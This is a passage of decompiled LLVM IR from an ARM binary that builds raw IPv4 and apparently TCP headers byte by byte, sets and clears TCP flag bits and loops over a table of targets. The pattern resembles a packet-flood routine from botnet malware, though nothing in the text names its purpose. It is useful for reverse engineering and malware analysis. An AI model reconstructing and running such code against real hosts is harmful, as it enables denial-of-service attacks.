  store i32 %v3_b5b4, i32* %r0.global-to-local, align 4
  %v1_b5bc = and i32 %v3_b5b4, 65280
  store i32 %v1_b5bc, i32* %r1.global-to-local, align 4
  %v3_b5c0 = mul i32 %v3_b5b4, 16777216
  %v4_b5c8 = mul nuw nsw i32 %v1_b5bc, 256
  %v5_b5c8 = or i32 %v4_b5c8, %v3_b5c0
  store i32 %v5_b5c8, i32* %r2.global-to-local, align 4
  %v2_b5d0 = call i32 @llvm.bswap.i32(i32 %v3_b5b4)
  store i32 %v2_b5d0, i32* %r3.global-to-local, align 4
  %v1_b5d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b5d4 = add i32 %v1_b5d4, 8
  %v3_b5d4 = inttoptr i32 %v2_b5d4 to i32*
  store i32 %v2_b5d0, i32* %v3_b5d4, align 4
  %v0_b5d8 = load i32, i32* @r6, align 4
  %v1_b5d8 = inttoptr i32 %v0_b5d8 to i32*
  %v2_b5d8 = load i32, i32* %v1_b5d8, align 4
  %v3_b5dc = udiv i32 %v2_b5d8, 65536
  store i32 %v3_b5dc, i32* %r2.global-to-local, align 4
  %v3_b5e06 = udiv i32 %v2_b5d8, 16777216
  store i32 %v3_b5e06, i32* %r1.global-to-local, align 4
  %v0_b5e4 = load i32, i32* @r5, align 4
  %v3_b5e4 = sdiv i32 %v0_b5e4, 256
  store i32 %v3_b5e4, i32* %r3.global-to-local, align 4
  %v1_b5e8 = trunc i32 %v3_b5e4 to i8
  %v2_b5e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_b5e8 = add i32 %v2_b5e8, 15
  %v4_b5e8 = inttoptr i32 %v3_b5e8 to i8*
  store i8 %v1_b5e8, i8* %v4_b5e8, align 1
  %v0_b5ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b5ec = trunc i32 %v0_b5ec to i8
  %v2_b5ec = load i32, i32* %ip.global-to-local, align 4
  %v3_b5ec = add i32 %v2_b5ec, 13
  %v4_b5ec = inttoptr i32 %v3_b5ec to i8*
  store i8 %v1_b5ec, i8* %v4_b5ec, align 1
  %v0_b5f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b5f0 = trunc i32 %v0_b5f0 to i8
  %v2_b5f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b5f0 = add i32 %v2_b5f0, 12
  %v4_b5f0 = inttoptr i32 %v3_b5f0 to i8*
  store i8 %v1_b5f0, i8* %v4_b5f0, align 1
  %v0_b5f4 = load i32, i32* @r5, align 4
  %v1_b5f4 = trunc i32 %v0_b5f4 to i8
  %v2_b5f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b5f4 = add i32 %v2_b5f4, 14
  %v4_b5f4 = inttoptr i32 %v3_b5f4 to i8*
  store i8 %v1_b5f4, i8* %v4_b5f4, align 1
  %v0_b5f8 = load i32, i32* @sl, align 4
  store i32 %v0_b5f8, i32* %r0.global-to-local, align 4
  %v1_b5fc = call i32* @malloc(i32 %v0_b5f8)
  %v3_b5fc = ptrtoint i32* %v1_b5fc to i32
  store i32 %v3_b5fc, i32* %r0.global-to-local, align 4
  store i32 %v4_b130, i32* %r1.global-to-local, align 4
  %v3_b604 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b604, i32* %r2.global-to-local, align 4
  %v2_b608 = load i32, i32* %r4.global-to-local, align 4
  %v5_b608 = mul i32 %v2_b608, 4
  %v6_b608 = add i32 %v5_b608, %v4_b130
  %v7_b608 = inttoptr i32 %v6_b608 to i32*
  store i32 %v3_b5fc, i32* %v7_b608, align 4
  %v0_b60c = load i32, i32* %r1.global-to-local, align 4
  %v1_b60c = load i32, i32* %r2.global-to-local, align 4
  %v4_b60c = mul i32 %v1_b60c, 4
  %v5_b60c = add i32 %v4_b60c, %v0_b60c
  %v6_b60c = inttoptr i32 %v5_b60c to i32*
  %v7_b60c = load i32, i32* %v6_b60c, align 4
  store i32 %v7_b60c, i32* @r4, align 4
  %v1_b610 = inttoptr i32 %v7_b60c to i8*
  %v2_b610 = load i8, i8* %v1_b610, align 1
  %tmp119 = urem i8 %v2_b610, 16
  %v1_b614 = zext i8 %tmp119 to i32
  %v1_b618 = or i32 %v1_b614, 64
  store i32 %v1_b618, i32* %r3.global-to-local, align 4
  %v1_b61c = trunc i32 %v1_b618 to i8
  store i8 %v1_b61c, i8* %v1_b610, align 1
  %v0_b620 = load i32, i32* @sl, align 4
  %v3_b620 = mul i32 %v0_b620, 65536
  store i32 %v3_b620, i32* %r2.global-to-local, align 4
  %v0_b624 = load i32, i32* @r4, align 4
  %v1_b624 = inttoptr i32 %v0_b624 to i8*
  %v2_b624 = load i8, i8* %v1_b624, align 1
  %v1_b62c = urem i32 %v0_b620, 256
  %tmp90 = udiv i32 %v0_b620, 256
  %v3_b630 = urem i32 %tmp90, 256
  %v1_b634 = and i8 %v2_b624, -16
  %v4_b638 = mul nuw nsw i32 %v1_b62c, 256
  %v5_b638 = or i32 %v4_b638, %v3_b630
  store i32 %v5_b638, i32* %r2.global-to-local, align 4
  %v1_b63c = or i8 %v1_b634, 5
  store i32 %v1_b1b0, i32* %ip.global-to-local, align 4
  store i32 %v1_b62c, i32* %r3.global-to-local, align 4
  store i8 %v1_b63c, i8* %v1_b624, align 1
  %v0_b64c = load i32, i32* %r3.global-to-local, align 4
  %v1_b64c = trunc i32 %v0_b64c to i8
  %v2_b64c = load i32, i32* @r4, align 4
  %v3_b64c = add i32 %v2_b64c, 3
  %v4_b64c = inttoptr i32 %v3_b64c to i8*
  store i8 %v1_b64c, i8* %v4_b64c, align 1
  store i32 %v5_b16c, i32* %r3.global-to-local, align 4
  %v0_b654 = load i32, i32* %ip.global-to-local, align 4
  %v2_b654 = icmp eq i32 %v0_b654, 0
  store i1 %v2_b654, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b480, i32* %r0.global-to-local, align 4
  store i32 %v3_b488, i32* %r1.global-to-local, align 4
  %v2_b660 = load i32, i32* @r4, align 4
  %v3_b660 = add i32 %v2_b660, 1
  %v4_b660 = inttoptr i32 %v3_b660 to i8*
  store i8 %v1_b660, i8* %v4_b660, align 1
  store i32 %v5_b1a4, i32* %ip.global-to-local, align 4
  %v0_b668 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b668, label %bb92, label %bb91

bb91:                                             ; preds = %dec_label_pc_b578
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %dec_label_pc_b578, %bb91
  %v0_b66c = load i32, i32* %r2.global-to-local, align 4
  %v1_b66c = trunc i32 %v0_b66c to i8
  %v2_b66c = load i32, i32* @r4, align 4
  %v3_b66c = add i32 %v2_b66c, 2
  %v4_b66c = inttoptr i32 %v3_b66c to i8*
  store i8 %v1_b66c, i8* %v4_b66c, align 1
  %v0_b670 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b670, label %.thread8, label %bb93

bb93:                                             ; preds = %bb92
  %v1_b670 = load i32, i32* %r3.global-to-local, align 4
  %v2_b670 = trunc i32 %v1_b670 to i8
  %v3_b670 = load i32, i32* @r4, align 4
  %v4_b670 = add i32 %v3_b670, 6
  %v5_b670 = inttoptr i32 %v4_b670 to i8*
  store i8 %v2_b670, i8* %v5_b670, align 1
  %v0_b674.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b674.pr, label %.thread8, label %bb94

bb94:                                             ; preds = %bb93
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb92, %bb93, %bb94
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_b67c = load i32, i32* %ip.global-to-local, align 4
  %v1_b67c = trunc i32 %v0_b67c to i8
  %v2_b67c = load i32, i32* @r4, align 4
  %v3_b67c = add i32 %v2_b67c, 8
  %v4_b67c = inttoptr i32 %v3_b67c to i8*
  store i8 %v1_b67c, i8* %v4_b67c, align 1
  %v0_b680 = load i32, i32* %r3.global-to-local, align 4
  %v1_b680 = trunc i32 %v0_b680 to i8
  %v2_b680 = load i32, i32* @r4, align 4
  %v3_b680 = add i32 %v2_b680, 9
  %v4_b680 = inttoptr i32 %v3_b680 to i8*
  store i8 %v1_b680, i8* %v4_b680, align 1
  %v0_b684 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b684, label %bb96, label %bb95

bb95:                                             ; preds = %.thread8
  %v1_b684 = load i32, i32* %r2.global-to-local, align 4
  %v2_b684 = trunc i32 %v1_b684 to i8
  %v3_b684 = load i32, i32* @r4, align 4
  %v4_b684 = add i32 %v3_b684, 7
  %v5_b684 = inttoptr i32 %v4_b684 to i8*
  store i8 %v2_b684, i8* %v5_b684, align 1
  br label %bb96

bb96:                                             ; preds = %.thread8, %bb95
  %v2_b68c = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_b68c, i32* %r3.global-to-local, align 4
  %v1_b690 = load i32, i32* @r4, align 4
  %v2_b690 = add i32 %v1_b690, 12
  %v3_b690 = inttoptr i32 %v2_b690 to i32*
  store i32 %v2_b68c, i32* %v3_b690, align 4
  %v0_b694 = load i32, i32* %r0.global-to-local, align 4
  %v1_b694 = trunc i32 %v0_b694 to i8
  %v2_b694 = load i32, i32* @r4, align 4
  %v3_b694 = add i32 %v2_b694, 4
  %v4_b694 = inttoptr i32 %v3_b694 to i8*
  store i8 %v1_b694, i8* %v4_b694, align 1
  %v3_b698 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b698, i32* %r2.global-to-local, align 4
  store i32 %v4_b120, i32* %r0.global-to-local, align 4
  %v4_b6a0 = mul i32 %v3_b698, 16
  %v5_b6a0 = add i32 %v4_b6a0, %v4_b120
  %v6_b6a0 = inttoptr i32 %v5_b6a0 to i32*
  %v7_b6a0 = load i32, i32* %v6_b6a0, align 4
  store i32 %v7_b6a0, i32* %r3.global-to-local, align 4
  %v0_b6a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b6a4 = trunc i32 %v0_b6a4 to i8
  %v2_b6a4 = load i32, i32* @r4, align 4
  %v3_b6a4 = add i32 %v2_b6a4, 5
  %v4_b6a4 = inttoptr i32 %v3_b6a4 to i8*
  store i8 %v1_b6a4, i8* %v4_b6a4, align 1
  %v0_b6a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6a8 = load i32, i32* @r4, align 4
  %v2_b6a8 = add i32 %v1_b6a8, 16
  %v3_b6a8 = inttoptr i32 %v2_b6a8 to i32*
  store i32 %v0_b6a8, i32* %v3_b6a8, align 4
  %v0_b6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_b6ac = mul i32 %v0_b6ac, 16
  %v1_b6b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b6b0 = add i32 %v1_b6b0, %v3_b6ac
  store i32 %v2_b6b0, i32* %r2.global-to-local, align 4
  %v1_b6b4 = add i32 %v2_b6b0, 13
  %v2_b6b4 = inttoptr i32 %v1_b6b4 to i8*
  %v3_b6b4 = load i8, i8* %v2_b6b4, align 1
  %v4_b6b4 = zext i8 %v3_b6b4 to i32
  store i32 %v4_b6b4, i32* %r1.global-to-local, align 4
  %v1_b6b8 = add i32 %v2_b6b0, 12
  %v2_b6b8 = inttoptr i32 %v1_b6b8 to i8*
  %v3_b6b8 = load i8, i8* %v2_b6b8, align 1
  %v4_b6b8 = zext i8 %v3_b6b8 to i32
  %v4_b6bc = mul nuw nsw i32 %v4_b6b4, 256
  %v5_b6bc = or i32 %v4_b6b8, %v4_b6bc
  store i32 %v5_b6bc, i32* %r3.global-to-local, align 4
  %v2_b6c0 = load i32, i32* @r4, align 4
  %v3_b6c0 = add i32 %v2_b6c0, 20
  %v4_b6c0 = inttoptr i32 %v3_b6c0 to i8*
  store i8 %v3_b6b8, i8* %v4_b6c0, align 1
  %v0_b6c4 = load i32, i32* @r4, align 4
  %v1_b6c4 = add i32 %v0_b6c4, 20
  store i32 %v1_b6c4, i32* @r6, align 4
  %v0_b6c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b6c8 = sdiv i32 %v0_b6c8, 256
  store i32 %v3_b6c8, i32* %r3.global-to-local, align 4
  %v1_b6cc = trunc i32 %v3_b6c8 to i8
  %v3_b6cc = add i32 %v0_b6c4, 21
  %v4_b6cc = inttoptr i32 %v3_b6cc to i8*
  store i8 %v1_b6cc, i8* %v4_b6cc, align 1
  %v0_b6d0 = load i32, i32* @r6, align 4
  %v1_b6d0 = add i32 %v0_b6d0, 13
  %v2_b6d0 = inttoptr i32 %v1_b6d0 to i8*
  %v3_b6d0 = load i8, i8* %v2_b6d0, align 1
  %v4_b6d0 = zext i8 %v3_b6d0 to i32
  store i32 %v4_b6d0, i32* %r3.global-to-local, align 4
  %v0_b6d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6d4 = add i32 %v0_b6d4, 8
  %v2_b6d4 = inttoptr i32 %v1_b6d4 to i32*
  %v3_b6d4 = load i32, i32* %v2_b6d4, align 4
  store i32 %v3_b6d4, i32* %r1.global-to-local, align 4
  %v1_b6d8 = or i32 %v4_b6d0, 1
  store i32 %v1_b6d8, i32* %r3.global-to-local, align 4
  %v1_b6dc = add i32 %v0_b6d4, 15
  %v2_b6dc = inttoptr i32 %v1_b6dc to i8*
  %v3_b6dc = load i8, i8* %v2_b6dc, align 1
  %v4_b6dc = zext i8 %v3_b6dc to i32
  store i32 %v4_b6dc, i32* %ip.global-to-local, align 4
  %v1_b6e0 = add i32 %v0_b6d4, 14
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i8*
  %v3_b6e0 = load i8, i8* %v2_b6e0, align 1
  %v4_b6e0 = zext i8 %v3_b6e0 to i32
  store i32 %v4_b6e0, i32* %r0.global-to-local, align 4
  %v2_b6e4 = add i32 %v0_b6d0, 4
  %v3_b6e4 = inttoptr i32 %v2_b6e4 to i32*
  store i32 %v3_b6d4, i32* %v3_b6e4, align 4
  %v0_b6e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6e8 = add i32 %v0_b6e8, 4
  %v2_b6e8 = inttoptr i32 %v1_b6e8 to i32*
  %v3_b6e8 = load i32, i32* %v2_b6e8, align 4
  store i32 %v3_b6e8, i32* %lr.global-to-local, align 4
  %v0_b6ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b6ec = trunc i32 %v0_b6ec to i8
  %v2_b6ec = load i32, i32* @r6, align 4
  %v3_b6ec = add i32 %v2_b6ec, 13
  %v4_b6ec = inttoptr i32 %v3_b6ec to i8*
  store i8 %v1_b6ec, i8* %v4_b6ec, align 1
  %v0_b6f0 = load i32, i32* @r6, align 4
  %v1_b6f0 = add i32 %v0_b6f0, 12
  %v2_b6f0 = inttoptr i32 %v1_b6f0 to i8*
  %v3_b6f0 = load i8, i8* %v2_b6f0, align 1
  %v4_b6f0 = zext i8 %v3_b6f0 to i32
  store i32 %v4_b6f0, i32* %r2.global-to-local, align 4
  %v1_b6f4 = add i32 %v0_b6f0, 13
  %v2_b6f4 = inttoptr i32 %v1_b6f4 to i8*
  %v3_b6f4 = load i8, i8* %v2_b6f4, align 1
  %v4_b6f4 = zext i8 %v3_b6f4 to i32
  %v0_b6f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b6f8 = load i32, i32* %ip.global-to-local, align 4
  %v4_b6f8 = mul i32 %v1_b6f8, 256
  %v5_b6f8 = or i32 %v4_b6f8, %v0_b6f8
  store i32 %v5_b6f8, i32* %r0.global-to-local, align 4
  %tmp120 = urem i8 %v3_b6f0, 16
  %v1_b6fc = zext i8 %tmp120 to i32
  %v3_b700 = sdiv i32 %v5_b6f8, 256
  store i32 %v3_b700, i32* %r1.global-to-local, align 4
  %v1_b704 = or i32 %v1_b6fc, 128
  store i32 %v1_b704, i32* %r2.global-to-local, align 4
  %v1_b708 = or i32 %v4_b6f4, 16
  store i32 %v1_b708, i32* %r3.global-to-local, align 4
  %v1_b70c = trunc i32 %v3_b700 to i8
  %v3_b70c = add i32 %v0_b6f0, 3
  %v4_b70c = inttoptr i32 %v3_b70c to i8*
  store i8 %v1_b70c, i8* %v4_b70c, align 1
  %v0_b710 = load i32, i32* %r2.global-to-local, align 4
  %v1_b710 = trunc i32 %v0_b710 to i8
  %v2_b710 = load i32, i32* @r6, align 4
  %v3_b710 = add i32 %v2_b710, 12
  %v4_b710 = inttoptr i32 %v3_b710 to i8*
  store i8 %v1_b710, i8* %v4_b710, align 1
  %v0_b714 = load i32, i32* %r3.global-to-local, align 4
  %v1_b714 = trunc i32 %v0_b714 to i8
  %v2_b714 = load i32, i32* @r6, align 4
  %v3_b714 = add i32 %v2_b714, 13
  %v4_b714 = inttoptr i32 %v3_b714 to i8*
  store i8 %v1_b714, i8* %v4_b714, align 1
  %v0_b718 = load i32, i32* %lr.global-to-local, align 4
  %v1_b718 = load i32, i32* @r6, align 4
  %v2_b718 = add i32 %v1_b718, 8
  %v3_b718 = inttoptr i32 %v2_b718 to i32*
  store i32 %v0_b718, i32* %v3_b718, align 4
  %v0_b71c = load i32, i32* %r0.global-to-local, align 4
  %v1_b71c = trunc i32 %v0_b71c to i8
  %v2_b71c = load i32, i32* @r6, align 4
  %v3_b71c = add i32 %v2_b71c, 2
  %v4_b71c = inttoptr i32 %v3_b71c to i8*
  store i8 %v1_b71c, i8* %v4_b71c, align 1
  %v0_b720 = call i32 @function_f6c4()
  %v1_b720 = trunc i32 %v0_b720 to i8
  store i32 %v0_b720, i32* %r0.global-to-local, align 4
  store i32 %v1_b1e8, i32* %r1.global-to-local, align 4
  %v0_b728 = load i32, i32* @r6, align 4
  %v1_b728 = add i32 %v0_b728, 13
  %v2_b728 = inttoptr i32 %v1_b728 to i8*
  %v3_b728 = load i8, i8* %v2_b728, align 1
  %v4_b728 = zext i8 %v3_b728 to i32
  store i32 %v1_b72c, i32* %r2.global-to-local, align 4
  %v1_b730 = and i32 %v4_b728, 223
  %v5_b734 = or i32 %v1_b730, %v4_b734
  store i32 %v5_b734, i32* %r3.global-to-local, align 4
  %v1_b738 = trunc i32 %v5_b734 to i8
  store i8 %v1_b738, i8* %v2_b728, align 1
  store i32 %v1_b208, i32* %ip.global-to-local, align 4
  %v0_b740 = load i32, i32* @r6, align 4
  %v1_b740 = add i32 %v0_b740, 13
  %v2_b740 = inttoptr i32 %v1_b740 to i8*
  %v3_b740 = load i8, i8* %v2_b740, align 1
  %v4_b740 = zext i8 %v3_b740 to i32
  store i32 %v1_b744, i32* %r3.global-to-local, align 4
  %v1_b748 = and i32 %v4_b740, 239
  %v5_b74c = or i32 %v1_b748, %v4_b74c
  store i32 %v5_b74c, i32* %r2.global-to-local, align 4
  %v1_b750 = trunc i32 %v5_b74c to i8
  store i8 %v1_b750, i8* %v2_b740, align 1
  store i32 %v1_b228, i32* %r1.global-to-local, align 4
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 13
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v1_b75c, i32* %r2.global-to-local, align 4
  %v1_b760 = and i32 %v4_b758, 247
  %v5_b764 = or i32 %v1_b760, %v4_b764
  store i32 %v5_b764, i32* %r3.global-to-local, align 4
  %v1_b768 = trunc i32 %v5_b764 to i8
  store i8 %v1_b768, i8* %v2_b758, align 1
  store i32 %v1_b248, i32* %ip.global-to-local, align 4
  %v0_b770 = load i32, i32* @r6, align 4
  %v1_b770 = add i32 %v0_b770, 13
  %v2_b770 = inttoptr i32 %v1_b770 to i8*
  %v3_b770 = load i8, i8* %v2_b770, align 1
  %v4_b770 = zext i8 %v3_b770 to i32
  store i32 %v1_b774, i32* %r3.global-to-local, align 4
  %v1_b778 = and i32 %v4_b770, 251
  %v5_b77c = or i32 %v1_b778, %v4_b77c
  store i32 %v5_b77c, i32* %r2.global-to-local, align 4
  %v1_b780 = trunc i32 %v5_b77c to i8
  store i8 %v1_b780, i8* %v2_b770, align 1
  store i32 %v1_b268, i32* %r1.global-to-local, align 4
  %v0_b788 = load i32, i32* @r6, align 4
  %v1_b788 = add i32 %v0_b788, 13
  %v2_b788 = inttoptr i32 %v1_b788 to i8*
  %v3_b788 = load i8, i8* %v2_b788, align 1
  %v4_b788 = zext i8 %v3_b788 to i32
  store i32 %v1_b78c, i32* %r2.global-to-local, align 4
  %v1_b790 = and i32 %v4_b788, 253
  %v4_b794 = or i32 %v1_b790, %v3_b794
  store i32 %v4_b794, i32* %r3.global-to-local, align 4
  %v1_b798 = trunc i32 %v4_b794 to i8
  store i8 %v1_b798, i8* %v2_b788, align 1
  %v0_b79c = load i32, i32* @r6, align 4
  %v1_b79c = add i32 %v0_b79c, 13
  %v2_b79c = inttoptr i32 %v1_b79c to i8*
  %v3_b79c = load i8, i8* %v2_b79c, align 1
  %v4_b79c = zext i8 %v3_b79c to i32
  %v0_b7a0 = load i32, i32* @r8, align 4
  %v1_b7a0 = urem i32 %v0_b7a0, 2
  %v1_b7a4 = and i32 %v4_b79c, 254
  store i32 %v1_b7a4, i32* %r2.global-to-local, align 4
  %v4_b7a836 = udiv i32 %v0_b720, 256
  %v2_b7ac = or i32 %v1_b7a4, %v1_b7a0
  store i32 %v2_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b0 = trunc i32 %v4_b7a836 to i8
  %v3_b7b0 = add i32 %v0_b79c, 15
  %v4_b7b0 = inttoptr i32 %v3_b7b0 to i8*
  store i8 %v1_b7b0, i8* %v4_b7b0, align 1
  %v3_b7b4 = load i32, i32* @r6, align 4
  %v4_b7b4 = add i32 %v3_b7b4, 14
  %v5_b7b4 = inttoptr i32 %v4_b7b4 to i8*
  store i8 %v1_b720, i8* %v5_b7b4, align 1
  %v0_b7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7b8 = trunc i32 %v0_b7b8 to i8
  %v2_b7b8 = load i32, i32* @r6, align 4
  %v3_b7b8 = add i32 %v2_b7b8, 13
  %v4_b7b8 = inttoptr i32 %v3_b7b8 to i8*
  store i8 %v1_b7b8, i8* %v4_b7b8, align 1
  %v0_b7bc = load i32, i32* @r4, align 4
  %v1_b7bc = add i32 %v0_b7bc, 40
  store i32 %v1_b7bc, i32* %r0.global-to-local, align 4
  %v0_b7c0 = load i32, i32* @sb, align 4
  store i32 %v0_b7c0, i32* @r1, align 4
  %v1_b7c4 = inttoptr i32 %v1_b7bc to i8*
  %v2_b7c4 = call i32 @function_f844(i8* %v1_b7c4)
  store i32 %v2_b7c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7c8

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b33c, %dec_label_pc_b548, %bb96
  %v3_b7c8 = load i32, i32* %stack_var_-40, align 4
  %v1_b7cc = add i32 %v3_b7c8, 1
  store i32 %v1_b7cc, i32* %r3.global-to-local, align 4
  %v1_b7d0 = load i32, i32* @fp, align 4
  %v9_b7d0 = icmp eq i32 %v1_b7cc, %v1_b7d0
  store i1 %v9_b7d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b7cc, i32* %stack_var_-40, align 4
  %v5_b7d8 = icmp slt i32 %v1_b7cc, %v1_b7d0
  br i1 %v5_b7d8, label %dec_label_pc_b33c, label %dec_label_pc_b7dc

dec_label_pc_b7dc:                                ; preds = %dec_label_pc_b7c8, %.thread26
  %v0_b7e420 = phi i32 [ %v0_b310, %.thread26 ], [ %v1_b7d0, %dec_label_pc_b7c8 ]
  %v0_b7dc = load i32, i32* @sb, align 4
  %v1_b7dc = add i32 %v0_b7dc, 40
  store i32 %v1_b7dc, i32* @sl, align 4
  %v1_b7e0 = add i32 %v0_b7dc, 20
  store i32 %v1_b7e0, i32* @r7, align 4
  %v2_b95c = icmp eq i32 %v1_b2c0, 0
  %v3_b818 = icmp eq i32 %v3_b318, 65535
  br label %dec_label_pc_b7e4

dec_label_pc_b7e4:                                ; preds = %dec_label_pc_b840, %dec_label_pc_b7dc
  %v0_b7e4 = phi i32 [ %v1_b920, %dec_label_pc_b840 ], [ %v0_b7e420, %dec_label_pc_b7dc ]
  %v2_b7e4 = icmp eq i32 %v0_b7e4, 0
  store i1 %v2_b7e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_b7e4, 1
  br label %dec_label_pc_b7ec

dec_label_pc_b7ec:                                ; preds = %dec_label_pc_b7ec, %dec_label_pc_b7e4
  br i1 %tmp97, label %dec_label_pc_b7ec, label %dec_label_pc_b7f0

dec_label_pc_b7f0:                                ; preds = %dec_label_pc_b7ec
  %v0_b7f0 = load i32, i32* @r7, align 4
  %tmp98 = mul i32 %v0_b7f0, 256
  %v1_b7f8 = and i32 %tmp98, 65280
  %tmp99 = udiv i32 %v0_b7f0, 256
  %v4_b7fc = urem i32 %tmp99, 256
  %v5_b7fc = or i32 %v4_b7fc, %v1_b7f8
  store i32 %v5_b7fc, i32* @r8, align 4
  store i32 %v4_b130, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b318, i32* %ip.global-to-local, align 4
  %v7_b810 = load i32, i32* %v2_b130, align 4
  store i32 %v7_b810, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b818, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_b824 = add i32 %v7_b810, 20
  store i32 %v1_b824, i32* @r5, align 4
  br i1 %v3_b818, label %dec_label_pc_b94c, label %dec_label_pc_b82c

dec_label_pc_b82c:                                ; preds = %dec_label_pc_b92c, %dec_label_pc_b7f0
  %v0_b838 = phi i32 [ %v7_b938, %dec_label_pc_b92c ], [ %v7_b810, %dec_label_pc_b7f0 ]
  store i1 %v2_b95c, i1* %cpsr_z.global-to-local, align 1
  %v0_b834 = load i32, i32* @sb, align 4
  store i32 %v0_b834, i32* @r1, align 4
  %v1_b838 = add i32 %v0_b838, 40
  store i32 %v1_b838, i32* %r0.global-to-local, align 4
  br i1 %v2_b95c, label %dec_label_pc_b840, label %dec_label_pc_b970

dec_label_pc_b840:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b94c, %dec_label_pc_b970
  %v2_b840 = phi i32 [ %v0_b838, %dec_label_pc_b82c ], [ %v0_b964, %dec_label_pc_b94c ], [ %v2_b840.pre, %dec_label_pc_b970 ]
  %v0_b840 = load i32, i32* @r6, align 4
  %v1_b840 = trunc i32 %v0_b840 to i8
  %v3_b840 = add i32 %v2_b840, 10
  %v4_b840 = inttoptr i32 %v3_b840 to i8*
  store i8 %v1_b840, i8* %v4_b840, align 1
  %v0_b844 = load i32, i32* @r6, align 4
  %v1_b844 = trunc i32 %v0_b844 to i8
  %v2_b844 = load i32, i32* @r4, align 4
  %v3_b844 = add i32 %v2_b844, 11
  %v4_b844 = inttoptr i32 %v3_b844 to i8*
  store i8 %v1_b844, i8* %v4_b844, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* @r4, align 4
  store i32 %v0_b84c, i32* @r0, align 4
  %v2_b850 = call i32 @function_de24(i32 %v0_b84c, i32 20)
  %v3_b850 = trunc i32 %v2_b850 to i8
  store i32 %v2_b850, i32* %r0.global-to-local, align 4
  %v3_b854 = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_b120, i32* %r2.global-to-local, align 4
  %v3_b85c = mul i32 %v3_b854, 16
  %v2_b860 = add i32 %v3_b85c, %v4_b120
  store i32 %v2_b860, i32* %r1.global-to-local, align 4
  %v1_b864 = add i32 %v2_b860, 4
  %v2_b864 = inttoptr i32 %v1_b864 to i32*
  %v3_b864 = load i32, i32* %v2_b864, align 4
  %v3_b868 = mul i32 %v3_b864, 65536
  store i32 %v3_b868, i32* %ip.global-to-local, align 4
  %tmp100 = mul i32 %v3_b864, 256
  %v1_b870 = and i32 %tmp100, 65280
  %tmp101 = udiv i32 %v3_b864, 256
  %v4_b874 = urem i32 %tmp101, 256
  %v5_b874 = or i32 %v4_b874, %v1_b870
  store i32 %v5_b874, i32* %r2.global-to-local, align 4
  %v1_b878 = add i32 %v3_b864, 1
  store i32 %v1_b878, i32* %r3.global-to-local, align 4
  store i32 %v1_b878, i32* %v2_b864, align 4
  %v0_b880 = load i32, i32* %r2.global-to-local, align 4
  %v1_b880 = load i32, i32* @r5, align 4
  %v2_b880 = add i32 %v1_b880, 4
  %v3_b880 = inttoptr i32 %v2_b880 to i32*
  store i32 %v0_b880, i32* %v3_b880, align 4
  %v0_b884 = load i32, i32* %r1.global-to-local, align 4
  %v1_b884 = add i32 %v0_b884, 8
  %v2_b884 = inttoptr i32 %v1_b884 to i32*
  %v3_b884 = load i32, i32* %v2_b884, align 4
  %tmp102 = mul i32 %v3_b884, 256
  %v1_b890 = and i32 %tmp102, 65280
  %tmp103 = udiv i32 %v3_b884, 256
  %v4_b894 = urem i32 %tmp103, 256
  %v5_b894 = or i32 %v4_b894, %v1_b890
  store i32 %v5_b894, i32* %r2.global-to-local, align 4
  %v4_b89837 = udiv i32 %v2_b850, 256
  %v1_b89c = trunc i32 %v4_b89837 to i8
  %v2_b89c = load i32, i32* @r4, align 4
  %v3_b89c = add i32 %v2_b89c, 11
  %v4_b89c = inttoptr i32 %v3_b89c to i8*
  store i8 %v1_b89c, i8* %v4_b89c, align 1
  %v3_b8a0 = load i32, i32* @r4, align 4
  %v4_b8a0 = add i32 %v3_b8a0, 10
  %v5_b8a0 = inttoptr i32 %v4_b8a0 to i8*
  store i8 %v3_b850, i8* %v5_b8a0, align 1
  %v0_b8a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a4 = load i32, i32* @r5, align 4
